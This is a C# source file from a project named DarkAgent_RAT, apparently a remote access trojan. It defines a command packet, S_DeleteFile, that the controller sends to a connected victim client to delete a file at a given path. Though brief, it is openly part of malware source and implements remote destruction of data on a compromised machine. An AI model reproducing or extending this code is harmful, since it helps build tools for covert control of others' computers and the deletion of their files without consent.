using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    class S_DeleteFile : SendBasePacket
    {
        private string FileLocation;
        public S_DeleteFile(RatClients client, string FileLocation)
            : base(client)
        {
            this.FileLocation = FileLocation;
        }
        protected internal override void Write()
        {
            WriteByte(2);
            WriteString(FileLocation);
        }
    }
}
